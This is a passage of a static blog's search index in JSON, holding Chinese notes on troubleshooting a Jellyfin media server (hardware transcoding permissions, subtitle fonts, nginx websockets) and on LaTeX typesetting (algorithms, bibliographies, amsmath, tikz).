<li>\u636e\u8bf4\u8fd8\u53ef\u80fd\u5bfc\u81f4\uff1a\u64ad\u653e nas \u89c6\u9891\u4e14\u89c6\u9891\u5f88\u5927\u65f6\uff0c\u9700\u8981\u628a\u89c6\u9891\u8bfb\u53d6\u4e00\u904d\uff0c\u5bfc\u81f4\u4f1a\u5361\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u624d\u80fd\u5f00\u59cb\u64ad\u653e</li> </ul> <p>\u9650\u5236\u8f6c\u7801\u901f\u5ea6\uff1a\u5efa\u8bae\u5f00\u542f</p> <p>\u5f53\u8f6c\u7801\u6216\u8005\u518d\u5c01\u88c5\u7684\u8fdb\u5ea6\u8ddd\u79bb\u5f53\u524d\u64ad\u653e\u8fdb\u5ea6\u8db3\u591f\u8fdc\u65f6\uff0c\u6682\u505c\u8fd9\u4e2a\u8fc7\u7a0b\u4ee5\u51cf\u5c11\u8d44\u6e90\u6d88\u8017\u3002\u5f53\u89c2\u770b\u89c6\u9891\u65f6\u4e0d\u7ecf\u5e38\u8c03\u6574\u64ad\u653e\u8fdb\u5ea6\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u529f\u80fd\u5c06\u975e\u5e38\u6709\u7528\u3002\u5982\u679c\u4f60\u9047\u5230\u4e86\u64ad\u653e\u95ee\u9898\uff0c\u8bf7\u5173\u95ed\u8fd9\u4e2a\u9009\u9879\u3002</p> <p>\u542f\u7528\u5907\u7528\u5b57\u4f53\uff1a\u89e3\u51b3\u4e2d\u6587\u5b57\u5e55\u663e\u793a\u65b9\u6846\u95ee\u9898</p> <p>\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u5907\u7528\u5b57\u4f53\u3002\u8fd9\u53ef\u4ee5\u907f\u514d\u4e00\u4e9b\u5b57\u5e55\u6e32\u67d3\u4e0d\u6b63\u786e\u7684\u95ee\u9898\u3002</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5f00\u542f-va-api-\u52a0\u901f\u540e\u64ad\u653e\u62a5\u9519","title":"\u5f00\u542f va-api \u52a0\u901f\u540e\uff0c\u64ad\u653e\u62a5\u9519","text":"<p>\u8bbe\u7f6e\u786c\u4ef6\u52a0\u901f vaapi\uff0c\u4f46\u662f\u64ad\u653e\u663e\u5f0f\u4e0d\u517c\u5bb9\u7684\u683c\u5f0f\u5f39\u7a97\uff0c\u901a\u8fc7\u67e5\u770b ffmpeg log\uff0c\u53ef\u4ee5\u770b\u5230</p> <pre><code>[AVHWDeviceContext @ 0x562f58a85d40] No VA display found for device /dev/dri/renderD128.\nDevice creation failed: -22.\nFailed to set value '/dev/dri/renderD128' for option 'vaapi_device': Invalid argument\nError parsing global options: Invalid argument\n</code></pre> <p>\u5747\u662f\u7531\u4e8e/dev/dri \u6743\u9650\u8bbe\u7f6e\u95ee\u9898\u5bfc\u81f4\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7 group-add \u53c2\u6570\u89e3\u51b3\u3002</p> <p>With the newer releases, you can the\u00a0group-add\u00a0docker parameter to get around the issue of /dev/dri/renderD128 needing \"render\" group membership in Ubuntu. If you use docker run, you can use the group name instead of the number(<code>--group-add=render</code>). In my /etc/group file, the group number for the render group is 122.</p> <ul> <li>docker<ul> <li>docker run: <code>--group-add=\"122\"</code></li> <li>docker-compose: <code>group_add: \"122\"</code></li> </ul> </li> <li>lxc \u9700\u8981\u8bbe\u7f6e gpu \u8bbe\u5907 gid</li> </ul> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u76f8\u540c\u95ee\u9898\uff1aIncorrect permissions for /dev/dri \u00b7 Issue #207</li> <li>\u76f8\u540c\u95ee\u9898\uff1aHardware acceleration isn't working properly \u00b7 Issue #26</li> <li>linuxserver docker \u4e2d\u7684\u89e3\u51b3\u65b9\u6cd5\uff1aIncorrect permissions for /dev/dri \u00b7 Issue #207</li> <li>docker user permission for transcoding \u00b7 Issue #2281 \u00b7 jellyfin/jellyfin \u00b7 GitHub</li> </ul>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5b57\u5e55\u4e71\u7801","title":"\u5b57\u5e55\u4e71\u7801","text":"<p>\u4e2d\u6587\u5b57\u5e55\u663e\u793a\u65b9\u6846\uff0c\u9700\u8981\u8bbe\u7f6e\u5907\u7528\u5b57\u4f53\u3002 \u5728\u5907\u7528\u5b57\u4f53\u76ee\u5f55\u4e0b\u653e\u7f6e\u5b57\u4f53 ttf \u6587\u4ef6\uff0c\u6846\u6846\u6d88\u5931\u3002</p> <pre><code>root@ubuntu20 \u279c  conf.d l /fonts\ntotal 24M\n-rw-rw-rw- 1 jellyfin jellyfin  12M Oct  8  2021 FZFSK.TTF\n-rw-rw-rw- 1 jellyfin jellyfin 9.5M Nov 28  2017 FZHTK.TTF\n-rw-rw-rw- 1 jellyfin jellyfin  14M Dec 21  2017 FZKTK.TTF\n-rw-rw-rw- 1 jellyfin jellyfin 9.5M Nov 28  2017 FZSSK.TTF\n</code></pre> <p>\u63a7\u5236\u53f0 -&gt; \u64ad\u653e -&gt; \u5907\u7528\u5b57\u4f53 </p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5f00\u542f-hdr-\u8272\u8c03\u6620\u5c04\u540e\u64ad\u653e\u89c6\u9891\u62a5\u9519","title":"\u5f00\u542f HDR \u8272\u8c03\u6620\u5c04\u540e\u64ad\u653e\u89c6\u9891\u62a5\u9519","text":"<p>\u4e0d\u540c\u663e\u5361\u5bf9\u4e8e\u8272\u8c03\u6620\u5c04\u7684\u652f\u6301\u662f\u4e0d\u540c\u7684</p> <ul> <li>intel\uff1aVPP \u8272\u8c03\u6620\u5c04\uff0c\u548c\u57fa\u4e8e Opencl \u548c Cuda \u7684\u8272\u8c03\u6620\u5c04</li> <li>nvidia\uff1aCuda</li> <li>amd\uff1aopencl</li> </ul> <p>\u6d4b\u8bd5\u89c6\u9891</p> <ul> <li>\u5200\u5251\u795e\u57df\u65e0\u591c\u661f\u7684\u548f\u53f9\u8c03\uff1a4K HEVC SDR</li> <li>\u4f60\u7684\u540d\u5b57 2160p\uff1a4K HEVC HDR</li> <li>\u5c0f\u9ec4\u4eba\uff1a4K HEVC HDR</li> </ul>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5a92\u4f53\u5e93\u4e2d\u6587\u6846\u6846","title":"\u5a92\u4f53\u5e93\u4e2d\u6587\u6846\u6846","text":"<p>UPDATE\uff1a\u8fd9\u4e2a\u5728\u65b0\u7248 docker \u955c\u50cf\u4e2d\u53ef\u80fd\u5df2\u7ecf\u4fee\u590d\uff0c\u6ca1\u9047\u5230\u8fc7\u8be5\u95ee\u9898\u3002</p> <p>\u867d\u7136\u5b57\u5e55\u5df2\u7ecf\u89e3\u51b3\u4e86\uff0c\u4f46\u662f system \u7684 font \u5e76\u4e0d\u4f1a\u4f7f\u7528 Chinese library names are displayed as square \u00b7 Issue #5636 \u00b7 jellyfin/jellyfin (github.com)</p> <p>\u6620\u5c04\u7cfb\u7edf\u5b57\u4f53 <pre><code>jellyfin:\n    volumes:\n      - /usr/share/fonts:/usr/share/fonts\n      - /usr/share/fontconfig:/usr/share/fontconfig\n</code></pre></p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#syncplay-\u4e0d\u5de5\u4f5c","title":"syncplay \u4e0d\u5de5\u4f5c","text":"<p>\u672c\u5730\u7684 jellyfin \u901a\u8fc7 nginx \u53cd\u5411\u4ee3\u7406\uff0c\u5728\u516c\u7f51\u63d0\u4f9b\u670d\u52a1\u3002</p> <p>nginx \u53cd\u5411\u4ee3\u7406\u5bfc\u81f4 syncplay \u4e0d\u5de5\u4f5c\uff08\u6dfb\u52a0\u5230 group \u540e\u6ca1\u6709\u4efb\u4f55\u53cd\u6620\uff09Syncplay: how to? : r/jellyfin (reddit.com)</p> <p>\u95ee\u9898\u51fa\u5728 nginx \u6ca1\u6709\u4ee3\u7406 websocket\uff0c\u4f7f\u7528\u5b98\u65b9\u63d0\u4f9b\u7684 nginx \u914d\u7f6e\u6587\u4ef6\u5373\u53ef\u3002 Nginx | Jellyfin</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#copy-stream-url","title":"copy stream url","text":"<p>\u53ef\u4ee5\u7528\u4e8e vrchat \u7b49 video player\u3002 \u4f46\u662f\u6709\u6cc4\u9732 session \u7684\u98ce\u9669\uff0c\u6709\u4eba\u63d0\u51fa\u662f\u5426\u8981\u4fee\u590d</p> <ul> <li>logout \u540e\u5c31\u5931\u6548\u4e86 Refactor \"Copy Stream URL\" to not leak the user's session API key \u00b7 Issue #10808 \u00b7 jellyfin/jellyfin (github.com)</li> </ul>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u76f4\u63a5\u64ad\u653e-h265-\u7684\u65b9\u6cd5","title":"\u76f4\u63a5\u64ad\u653e h265 \u7684\u65b9\u6cd5","text":"<p>windows\u3001linux\u3001mac \u5ba2\u6237\u7aef\uff1ajellyfin-mpv-shim \u00b7 PyPI</p> <ul> <li>\u5229\u7528 jellyfin \u7684\u6295\u5c4f\u529f\u80fd\uff0c\u5c06\u6d4f\u89c8\u5668\u7684\u64ad\u653e\u8f6c\u79fb\u5230\u5ba2\u6237\u7aef\u4e0a\uff0c\u4efb\u610f\u683c\u5f0f\u4e0d\u7528\u8f6c\u7801</li> </ul>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u663e\u5361\u786c\u4ef6\u8f6c\u7801-datasheet","title":"\u663e\u5361\u786c\u4ef6\u8f6c\u7801 datasheet","text":"<p>Video Encode and Decode GPU Support Matrix | NVIDIA Developer nVidia Hardware Transcoding Calculator for Plex Estimates (elpamsoft.com)</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u65e0\u6cd5\u626b\u63cf\u51fa\u89c6\u9891","title":"\u65e0\u6cd5\u626b\u63cf\u51fa\u89c6\u9891","text":"<p>\u539f\u6765 movie \u683c\u5f0f\u5185\u5bb9</p> <p>\u6dfb\u52a0\u7684\u6839\u8def\u5f84\uff08\u5982 <code>/MediaLib/Disk1/WebDL/Jellyfin</code> \uff09\u4e0b\u9762\u53ef\u4ee5\u6709\u82e5\u5e72\u7ea7\u5b50\u76ee\u5f55</p> <p>\u4f46\u662f\u6bcf\u4e2a\u5b50\u76ee\u5f55\u540c\u7ea7\u4e0d\u80fd\u6709\u5176\u5b83\u89c6\u9891\u6587\u4ef6\uff0c\u5426\u5219\u5c31\u4e0d\u4f1a\u626b\u63cf\u5b50\u76ee\u5f55\uff0c\u65e5\u5fd7\u4e5f\u770b\u4e0d\u51fa\u4e1c\u897f\u3002</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5176\u4ed6","title":"\u5176\u4ed6","text":"","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#mpv-shim","title":"mpv-shim","text":"<p>\u907f\u514d\u9700\u8981\u8f6c\u7801\uff0c\u5bf9\u4e8e\u52a8\u6f2b\uff0c\u53ef\u4ee5\u5b89\u88c5\u63d2\u4ef6\uff0c\u5b9e\u73b0\u5b9e\u65f6\u63d2\u5e27\uff0c\u548c\u8d85\u5206\u3002\u641c\u7d22 mpv \u76f8\u5173\u63d2\u4ef6</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-jellyfin%E7%9B%B8%E5%85%B3/#\u5f52\u6863","title":"\u5f52\u6863","text":"<p>tmm \u4e2d\u6587\u4e71\u7801</p> <p>UDPATE\uff1a\u4e0d\u518d\u4f7f\u7528 tmm \u4e86\u3002</p> <pre><code>wget https://mirrors.aliyun.com/alpine/edge/testing/x86_64/font-wqy-zenhei-0.9.45-r2.apk\napk add --allow-untrusted font-wqy-zenhei-0.9.45-r2.apk\n</code></pre> <p>\u4f46\u662f\u4fee\u6539\u4e86 compose\uff0c\u4f1a\u5220\u9664\u539f\u672c\u5bb9\u5668\uff0c\u56e0\u6b64\u9700\u8981\u91cd\u65b0\u8bbe\u7f6e\u3002 \u6c38\u4e45\u529e\u6cd5\uff0c\u4fee\u6539\u4e3a\u7b2c\u4e09\u65b9 docker \u955c\u50cfdzhuang/tinymediamanager-docker: A repository for creating a docker container including TinyMediaManager with GUI interface. (github.com)</p>","tags":["jellyfin"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/","title":"latex","text":"<p>latex</p>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u57fa\u672c\u6392\u7248","title":"\u57fa\u672c\u6392\u7248","text":"","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#table","title":"table","text":"<p><code>table*</code> \u73af\u5883\u662f\u7528\u6765\u521b\u5efa\u8de8\u53cc\u680f\u7684\u6d6e\u52a8\u8868\u683c\u7684 <code>\\resizebox{\\columnwidth}{!}{...}</code>\uff0c\u8fd9\u4f1a\u5c06\u8868\u683c\u7f29\u653e\u5230\u5355\u680f\u7684\u5bbd\u5ea6 \u5728 LaTeX \u4e2d\uff0c<code>\\textwidth</code> \u4ee3\u8868\u6574\u4e2a\u9875\u9762\u7684\u6587\u672c\u5bbd\u5ea6\uff0c\u800c <code>\\columnwidth</code> \u4ee3\u8868\u5355\u680f\u7684\u5bbd\u5ea6\u3002</p>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u7279\u6b8a\u7b26\u53f7","title":"\u7279\u6b8a\u7b26\u53f7","text":"","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u7a7a\u683c","title":"\u7a7a\u683c","text":"","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u7b97\u6cd5","title":"\u7b97\u6cd5","text":"<p>\u5b8f\u5305</p> <pre><code>\\usepackage{algorithm}\n\\usepackage{algorithmic}\n</code></pre> <p>\u683c\u5f0f</p> <pre><code>\\begin{algorithm}\n %\\textsl{}\\setstretch{1.8}\n \\renewcommand{\\algorithmicrequire}{\\textbf{Input:}}\n \\renewcommand{\\algorithmicensure}{\\textbf{Output:}}\n \\caption{Iterative Solution for Training Stage}\n \\label{alg1}\n \\begin{algorithmic}[1]\n     \\REQUIRE target user group $\\mathbf{U}=\\left\\{u_{i}\\right\\}$, group set $\\mathbf{G}=\\left\\{g_{k}\\right\\}$ and attendance records $\\left\\{s_{i, k}^{0}\\right\\}$\n     \\renewcommand{\\algorithmicrequire}{\\textbf{Store:}}\n     \\REQUIRE group attributes $\\mathbf{a}_{k}$ for each $g_{k} \\in \\mathbf{G}$\n     \\ENSURE  users' profile $\\left\\langle\\mathbf{p}_{i}, h_{i, 0}\\right\\rangle$ and social strength $w_{i j}$\n  \\STATE Iteration = True;\n  \\WHILE{Iteration}\n  \\STATE Iteration $=$ False;\n  \\FOR {$u \\in \\mathbf{U}, g_{k} \\in \\mathbf{G}$}\n  \\STATE update $\\left\\langle\\mathbf{p}_{i}, h_{i, 0}\\right\\rangle$ and $\\left\\{w_{i j}\\right\\}$ until convergence;\n  \\STATE update $f_{i, k}, h_{i, k}$ based on Equation 2;\n  \\STATE update $s_{i, k}$ as $\\mathcal{I}\\left(f_{i, k}-h_{i, k}\\right)$;\n  \\IF{$s_{i, k}$ changed} \n  \\STATE Iteration $=$ True;\n  \\ENDIF\n  \\ENDFOR\n  \\ENDWHILE\n \\end{algorithmic}  \n\\end{algorithm}\n</code></pre>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u53c2\u8003\u6587\u732e","title":"\u53c2\u8003\u6587\u732e","text":"","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#bibtex","title":"BibTex","text":"<p>BibTEX \u662f LATEX \u5904\u7406\u53c2\u8003\u6587\u732e\u7684\u4f20\u7edf\u7684\u65b9\u5f0f\u3002\u9009\u62e9\u201c\u987a\u5e8f\u7f16\u7801\u5236\u201d\u6216\u201c\u8457\u8005-\u51fa\u7248\u5e74\u5236\u201d\u4e24\u79cd\u683c\u5f0f\u4e4b\u4e00</p> <p>.bib \u6570\u636e\u5e93\uff0c\u7f16\u8bd1\u751f\u6210 .bbl \u6587\u4ef6\u3002\u53c2\u8003\u6587\u732e\u6837\u5f0f\uff08.bst \u6587\u4ef6\uff09</p> <p>\u4e0a\u6807\u6837\u5f0f\uff08super\uff09 \uff0c\u5982\u201c\u5f20\u6559\u6388^[2-3] \u8ba4\u4e3a\u22ef\u22ef\u5f62\u6210\u4e86\u591a\u79cd\u7269\u7406\u6a21 \u578b^[7,9,11-13]\u201d\u3002 \u4e0e\u6b63\u6587\u5e73\u6392\uff08inline\uff09\uff0c\u6587\u732e\u5e8f\u53f7\u4f5c\u4e3a\u53d9\u8ff0\u6587\u5b57\u7684\u4e00\u90e8\u5206\uff0c\u5982\u201c\u5f20\u6559\u6388\u8ba4\u4e3a\u22ef\u22ef\u6839\u636e\u6587\u732e\\([4]^{101-105}\\)\u201d</p> <p>\u8457\u8005-\u51fa\u7248\u5e74\u5236\u7684\u6587\u732e\u5f15\u7528\u6807\u6ce8\u4e5f\u6709\u4e24\u79cd\u4e3b\u8981\u6a21\u5f0f\uff1a</p> <ul> <li>\u8457\u8005\u59d3\u540d\u4f5c\u4e3a\u6b63\u6587\u7684\u4e00\u90e8\u5206\uff0c\u6bd4\u5982\u201cZhang (2008)\u201d\uff0c\u540c\u9ed8\u8ba4\u7684 \\cite \u547d\u4ee4\u4e00\u6837\u3002</li> <li>\u8457\u8005\u4e0e\u5e74\u4efd\u5747\u5728\u62ec\u53f7\u4e2d\uff0c\u6bd4\u5982\u201c(Zhang, 2008)\u201d\u3002</li> </ul> <pre><code>\\cite   # \u9ed8\u8ba4\u8bbe\u7f6e\n\\inlinecite  # \u5728\u5c40\u90e8\u4e0e\u6b63\u6587\u5e73\u6392\n\n\\citet\n\\citep\n</code></pre> <p>\u53c2\u8003\u6587\u732e\u8868\u91c7\u7528\u8457\u8005-\u51fa\u7248\u5e74\u5236\u7ec4\u7ec7\u65f6\uff0c\u5404\u7bc7\u6587\u732e\u9996\u5148\u6309\u6587\u79cd\u96c6\u4e2d\uff0c\u7136\u540e \u6309\u8457\u8005\u5b57\u987a\u548c\u51fa\u7248\u5e74\u6392\u5217\uff1b\u4e2d\u6587\u6587\u732e\u53ef\u4ee5\u6309\u8457\u8005\u6c49\u8bed\u62fc\u97f3\u5b57\u987a\u6392\u5217\uff0c\u4e5f\u53ef\u4ee5\u6309 \u8457\u8005\u7684\u7b14\u753b\u7b14\u987a\u6392\u5217\u3002\u4f46\u7531\u4e8eBibTEX\u529f\u80fd\u7684\u5c40\u9650\u6027\uff0c\u65e0\u6cd5\u81ea\u52a8\u83b7\u53d6\u8457\u8005\u59d3\u540d \u7684\u62fc\u97f3\u6216\u7b14\u753b\u7b14\u987a\u8fdb\u884c\u6b63\u786e\u6392\u5e8f\u3002\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u5728.bib\u6570\u636e\u5e93\u7684\u4e2d\u6587\u6587\u732e \u7684key \u57df\u624b\u52a8\u5f55\u5165\u8457\u8005\u59d3\u540d\u7684\u62fc\u97f3\uff1a <pre><code>@book{capital, author = {\u9a6c\u514b\u601d and \u6069\u683c\u65af}, key = {ma3 ke4 si1 &amp; en1 ge2 si1}, ... }\n</code></pre> \u5982\u679c\u4e2d\u6587\u6587\u732e\u6570\u91cf\u8f83\u591a\uff0c\u63a8\u8350\u4f7f\u7528BibLaTeX\u5904\u7406\u53c2\u8003\u6587\u732e</p>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u5217\u51fa\u6240\u6709\u6587\u732e\u4e0d\u7ba1\u6709\u6ca1\u6709\u5f15\u7528","title":"\u5217\u51fa\u6240\u6709\u6587\u732e\uff08\u4e0d\u7ba1\u6709\u6ca1\u6709\u5f15\u7528\uff09","text":"<pre><code>\\nocite{*}\n</code></pre> <p>\u9002\u7528\u4e8e BibTex \u548c BibLaTex \u00a0</p>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#biblatex","title":"BibLaTex","text":"<p>BibLaTeX \u662f\u8f83\u65b0\u7684\u53c2\u8003\u6587\u732e\u5904\u7406\u65b9\u6848\u3002\u9700\u8981\u5728\u8f7d\u5165\u5b8f\u5305\u65f6\u901a\u8fc7\u9009\u62e9\u6837\u5f0f \uff08style\uff09\uff0c\u5e76\u4e14\u5728\u5bfc\u8a00\u533a\u4f7f\u7528\\addbibresource \u8bbe\u7f6e\u6570\u636e\u5e93\u7684\u8def\u5f84\uff0c\u6700\u540e\u5728\u53c2 \u8003\u6587\u732e\u8868\u7684\u4f4d\u7f6e\u4f7f\u7528\\printbibliography \u8f93\u51fa\u3002</p> <p>\u5bf9\u4e8e\u987a\u5e8f\u7f16\u7801\u5236\uff0c\u6587\u732e\u5f15\u7528\u6807\u6ce8\u9ed8\u8ba4\u4e3a\u4e0a\u6807\u6837\u5f0f\u3002\u5982\u679c\u8981\u5207\u6362\u4e3a\u4e0e\u6b63\u6587\u5e73 \u6392\uff0c\u4e00\u79cd\u65b9\u6cd5\u662f\u4f7f\u7528<code>\\parencite</code>\uff0c\u53e6\u4e00\u79cd\u662f\u8f7d\u5165 biblatex \u65f6\u7edf\u4e00\u8bbe\u7f6e\u3002 <pre><code>usepackage[bibstyle=ustcthesis-numeric, citestyle=ustcthesis-inline]{biblatex}\n</code></pre></p>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#svg-\u56fe\u7247","title":"svg \u56fe\u7247","text":"<p>How to Use SVG Images in LaTeX | Baeldung on Computer Science</p>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u5e38\u7528\u7684\u5305","title":"\u5e38\u7528\u7684\u5305","text":"","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#amsmath\u6570\u5b66\u516c\u5f0f","title":"amsmath\uff08\u6570\u5b66\u516c\u5f0f\uff09","text":"<p>Aligning equations with amsmath - Overleaf, Online LaTeX Editor</p> <ul> <li><code>multline</code>: \u591a\u884c\u516c\u5f0f\uff0c<code>\\\\</code> \u5de6\u4fa7\u5143\u7d20\u5de6\u5bf9\u9f50\uff0c\u53f3\u4fa7\u5143\u7d20\u53f3\u5bf9\u9f50</li> <li>align: \u4e00\u7ec4\u516c\u5f0f\uff0c\u4f7f\u7528 &amp; \u5bf9\u9f50\u3002\u6bcf\u6761\u516c\u5f0f\u90fd\u4f1a\u7f16\u53f7</li> <li>gather\uff1a\u4e00\u7ec4\u516c\u5f0f\uff0c\u4e0d\u5bf9\u9f50</li> <li>aligned\uff1a\u7528\u4e8e\u5d4c\u5957\u5728\u5176\u5b83\u73af\u5883\u4e2d\uff0c\u5c40\u90e8\u5bf9\u9f50</li> </ul> <p>\u8fd8\u662f\u65e0\u6cd5\u5b9e\u73b0\u957f\u516c\u5f0f\u548c\u5176\u5b83\u516c\u5f0f\u4f5c\u4e3a\u4e00\u7ec4\u7684\u60c5\u51b5\u3002 <pre><code>\\begin{gather}\n    \\begin{aligned}\n        ActShmem = \\min_{x} &amp; \\{ x \\in ShmemCarveout | MaxActBlk(x) = \\\\\n        &amp; MaxActBlk(MaxShmemPerSM) \\}\n    \\end{aligned}\\\\\n    L1\\ CacheSize = L1\\ Size - ActShmem\n\\end{gather}\n</code></pre></p> <p>\u4f7f\u7528 vspace \u8d1f\u503c <pre><code>\\vspace{-0.8cm}\n</code></pre></p> <p>\u5728\u9700\u8981\u6253\u6807\u7b7e\u7684\u516c\u5f0f\u884c\u672b\u5c3e\uff08\u901a\u5e38\u5728 <code>\\\\</code> \u4e4b\u524d\uff09</p>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#tikz-\u72b6\u6001\u56fe","title":"tikz \u72b6\u6001\u56fe","text":"<pre><code>\\begin{tikzpicture}[\n    -&gt;, &gt;=Stealth, % \u7bad\u5934\u6837\u5f0f\n    node distance=3cm, % \u8282\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\n    every state/.style={thick, minimum size=1.5cm}, % \u72b6\u6001\u6837\u5f0f\n    every edge/.style={draw, thick} % \u8fb9\u6837\u5f0f\n]\n\n% \u8282\u70b9\n\\node[state] (idle) {Idle};\n\\node[state, above right of=idle, xshift=0.5cm, yshift=0.5cm] (alloc) {Allocate};\n\\node[state, right of=idle, xshift=2cm] (evict) {Evict};\n\\node[state, below right of=idle, xshift=0.5cm] (wb) {Write Back};\n\n% \u8fb9\n\\path\n    (idle) edge[loop left] node {Read/Write hit} (idle)\n    (idle) edge[bend left] node[above] {Read/Write miss, read mem} (alloc)\n    (alloc) edge[bend left] node[below] {allocate success} (idle)\n    (alloc) edge node {allocate faild} (evict)\n    (evict) edge node {evict clean} (idle)\n    (evict) edge node {evict dirty} (wb)\n    (wb) edge node {write mem} (idle)\n    ;\n\\end{tikzpicture}\n</code></pre>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u5e95\u5c42","title":"\u5e95\u5c42","text":"","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#newcommand","title":"newcommand","text":"<pre><code>\\newcommand{\\\u547d\u4ee4\u540d}[\u53c2\u6570\u4e2a\u6570][\u53ef\u9009\u53c2\u6570\u9ed8\u8ba4\u503c]{\u5b9a\u4e49\u5185\u5bb9}\n</code></pre> <pre><code>\\newcommand{\\helloworld}{Hello, World!}\n\\helloworld\n\n\\newcommand{\\greet}[1]{Hello, #1!}\n\\greet{Alice}\n\n\\newcommand{\\authorinfo}[2]{Author: #1, Email: #2}\n\\authorinfo{John Doe}{john.doe@example.com}\n\n% \u5b9a\u4e49\u4e00\u4e2a\u5e26\u4e00\u4e2a\u53ef\u9009\u53c2\u6570\u7684\u547d\u4ee4 \\sectiontitle\n\\newcommand{\\sectiontitle}[1][Default Title]{Section: #1}\n\\sectiontitle  # \u5982\u679c\u4e0d\u63d0\u4f9b\u53c2\u6570\uff0c\u5219\u4f7f\u7528\u9ed8\u8ba4\u503c \"Default Title\"\n\\sectiontitle{Introduction}\n</code></pre>","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u5b57\u4f53","title":"\u5b57\u4f53","text":"","tags":["latex"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/11/29/2022-11-29-latex/#\u5b57\u53f7","title":"\u5b57\u53f7","text":"\u4e2d\u6587\u5b57\u53f7 \u82f1\u6587\u5b57\u53f7\uff08\u78c5\uff09/pt \u6beb\u7c73/mm \u50cf\u7d20/px \u521d\u53f7 42 14.82 56 \u5c0f\u521d 36 12.7 48 \u4e00\u53f7 26 9.17 34.7 \u5c0f\u4e00 24 8.47 32 \u4e8c\u53f7 22 7.76 29.3 \u5c0f\u4e8c 18 6.35 24 \u4e09\u53f7 16 5.64 21.3 \u5c0f\u4e09 15 